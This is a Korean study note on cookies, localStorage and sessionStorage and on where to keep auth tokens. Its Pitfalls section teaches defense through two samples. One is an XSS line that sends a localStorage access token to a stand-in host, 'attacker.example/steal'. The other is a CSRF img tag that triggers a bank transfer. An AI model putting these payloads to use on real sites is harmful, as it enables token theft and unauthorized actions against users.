# 브라우저 저장소와 토큰 보관

> TL;DR: cookie/localStorage/sessionStorage는 수명·용량·서버 전송·JS 접근성이 다르며, 인증 토큰은 XSS와 CSRF를 함께 따져 httpOnly+Secure+SameSite 쿠키 또는 localStorage 중에 고른다.

## What

브라우저가 데이터를 클라이언트에 저장하는 세 가지 방식.

- **cookie**: key=value 문자열. 매 요청마다 같은 도메인의 HTTP 헤더(`Cookie`)에 자동으로 실려 서버로 전송된다. 용량은 도메인당 약 4KB. 만료(`Expires`/`Max-Age`)를 지정하면 그때까지 유지되고, 지정하지 않으면 세션 쿠키로 탭/브라우저 종료 시 삭제된다.
- **localStorage**: key/value(둘 다 문자열) 저장소. 만료가 없어 사용자가 지우거나 코드로 삭제할 때까지 유지된다. 도메인(origin)당 약 5~10MB. 서버로 자동 전송되지 않는다.
- **sessionStorage**: API는 localStorage와 같지만 수명이 탭 단위다. 탭을 닫으면 사라지고, 같은 URL을 새 탭으로 열어도 공유되지 않는다.

localStorage와 sessionStorage는 origin(scheme+host+port) 단위로 격리되어, `https://a.com`과 `http://a.com`은 다른 저장 공간이다. 쿠키는 기준이 다르다. 기본 키는 도메인(host)이라 scheme과 port를 구분하지 않으므로, `Secure` 없는 쿠키는 `http://a.com`과 `https://a.com`이 같은 쿠키를 공유한다. `Path` 속성으로 경로 범위를 좁힐 수는 있다.

| 구분 | cookie | localStorage | sessionStorage |
|---|---|---|---|
| 수명 | Expires/Max-Age 또는 세션 | 영구(수동 삭제까지) | 탭 종료까지 |
| 용량 | 약 4KB | 약 5~10MB | 약 5~10MB |
| 서버 자동 전송 | O(헤더) | X | X |
| JS 접근 | httpOnly면 불가 | 항상 가능 | 항상 가능 |

## Why it matters

로그인 구현에서 토큰을 어디에 둘지 결정할 때 매번 부딪힌다. localStorage에 access token을 넣으면 `fetch` 헤더에 직접 붙이기 쉽지만 XSS에 노출된다. 쿠키에 넣으면 자동 전송되고 httpOnly로 JS 접근을 막을 수 있지만 CSRF를 따로 막아야 한다. 면접에서 "토큰을 어디에 저장했고 왜 그 선택을 했는가"는 보안 트레이드오프를 이해했는지 확인하는 단골 질문이다.

## How

웹스토리지 읽기/쓰기. 값은 문자열만 저장되므로 객체는 직렬화한다.

```js
// 저장 (객체는 JSON 문자열로)
localStorage.setItem("user", JSON.stringify({ id: 1, name: "민" }));
sessionStorage.setItem("step", "2");

// 읽기
const user = JSON.parse(localStorage.getItem("user")); // { id: 1, name: "민" }

// 삭제
localStorage.removeItem("user");
localStorage.clear(); // 해당 origin 전체 삭제
```

쿠키를 JS로 읽고 쓰기. httpOnly 쿠키는 아래 `document.cookie`에 나타나지 않는다.

```js
// 쓰기: 1시간 만료, HTTPS에서만, 같은 사이트 요청에만 전송
document.cookie =
  "theme=dark; Max-Age=3600; Secure; SameSite=Strict; path=/";

// 읽기: httpOnly가 아닌 쿠키만 문자열로 보인다
console.log(document.cookie); // "theme=dark"
```

서버가 httpOnly 인증 쿠키를 내려주는 응답 헤더. 발급은 서버만 할 수 있고, 이후 같은 origin 요청에 자동으로 실린다.

```ts
// 서버 응답 헤더 (예: Express)
res.setHeader(
  "Set-Cookie",
  "accessToken=eyJ...; HttpOnly; Secure; SameSite=Lax; Max-Age=3600; Path=/"
);
```

httpOnly 쿠키를 자동 전송하려면 fetch에 `credentials`를 명시한다. 교차 출처라면 서버도 `Access-Control-Allow-Credentials: true`를 응답해야 한다.

```ts
await fetch("https://api.example.com/me", {
  method: "GET",
  credentials: "include", // 쿠키를 요청에 포함
});
```

## Pitfalls

localStorage는 문자열만 저장한다. 객체를 그대로 넣으면 `[object Object]`가 저장된다.

```js
localStorage.setItem("user", { id: 1 });
localStorage.getItem("user"); // "[object Object]"  의도와 다름
```

localStorage에 토큰을 넣으면 XSS 스크립트가 한 줄로 탈취할 수 있다. 페이지에 주입된 악성 스크립트나 신뢰할 수 없는 서드파티 `<script>`가 같은 origin에서 실행되면 막을 방법이 없다.

```js
// XSS로 주입된 코드가 토큰을 외부로 전송
fetch("https://attacker.example/steal?t=" + localStorage.getItem("accessToken"));
```

httpOnly 쿠키는 위 `document.cookie` 접근을 막아 토큰 문자열 자체는 못 빼간다. 대신 쿠키는 자동 전송되므로 CSRF가 생긴다. 사용자가 로그인된 상태에서 공격자 페이지가 다음 요청을 보내면 브라우저가 쿠키를 자동으로 붙인다.

```html
<!-- 공격자 사이트가 사용자 쿠키를 자동 전송시킴 -->
<img src="https://bank.example/transfer?to=attacker&amount=10000" />
```

CSRF는 `SameSite=Strict`(외부 사이트발 요청에 쿠키 미전송) 또는 `Lax`로 줄이고, 상태 변경 요청에 CSRF 토큰을 추가해 막는다. `SameSite=None`을 쓰면 교차 사이트 전송이 다시 열리므로 반드시 `Secure`와 함께 쓰고 CSRF 방어를 별도로 둔다.

## 직접 확인

1. 같은 페이지에서 `localStorage.setItem("t", "1")`을 실행한 뒤, DevTools Application 탭의 Local Storage / Session Storage / Cookies 세 곳을 열어 값이 어디에 들어가는지, 탭을 닫고 새로 열면 무엇이 남고 무엇이 사라지는지 직접 비교하라.
2. Express나 Next.js Route Handler로 `Set-Cookie: token=abc; HttpOnly`를 응답하는 엔드포인트를 만들고, 브라우저 콘솔에서 `document.cookie`를 출력해 httpOnly 쿠키가 보이지 않는지, Network 탭의 다음 요청 헤더 `Cookie`에는 실려 나가는지 확인하라.

## 스스로 답하기

1. localStorage와 sessionStorage는 수명·용량·서버 전송·다른 탭 공유 측면에서 각각 어떻게 다른가?
2. access token을 localStorage에 둘 때와 httpOnly 쿠키에 둘 때, 각각 어떤 공격(XSS/CSRF)에 노출되고 어떻게 막는가?
3. `SameSite`의 Strict/Lax/None은 각각 어떤 요청에서 쿠키를 보내고 안 보내는가, 그리고 None을 쓸 때 함께 지켜야 할 조건은?

## 내 프로젝트 연결

OAuth 로그인 후 토큰/세션을 어디에 보관했는지, httpOnly 쿠키 vs localStorage 중 무엇을 썼고 그 보안 트레이드오프를 설명할 수 있는지 점검해보라.
